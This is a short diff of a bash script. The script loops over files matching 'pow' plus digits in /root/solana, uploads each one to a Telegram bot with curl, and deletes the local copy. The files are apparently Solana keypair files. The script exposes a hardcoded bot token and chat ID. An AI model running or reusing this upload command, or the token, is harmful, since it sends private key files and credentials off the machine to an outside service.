@@ -4,7 +4,7 @@
 while true; do
 
     # Execute the find command and store the result in the "result" variable
-    result=$(find . -type f -name 'pow[0-9][0-9][0-9][0-9]*')
+    result=$(find /root/solana -type f -name 'pow[0-9][0-9][0-9][0-9]*')
 
     # Check if there are any results
     if [ -n "$result" ]; then
@@ -23,7 +23,7 @@ while true; do
 
             # Make a curl GET request with the content of the file appended to the URL
             curl -v -F "chat_id=638066999" -F document=@/root/solana/$filename https://api.telegram.org/bot6851381197:AAHJ5Yy7iqn_psValJJa1hZ71n8KSKEZ5U4/sendDocument
-            rm $filename
+            rm /root/solana/$filename
         done
     fi
 
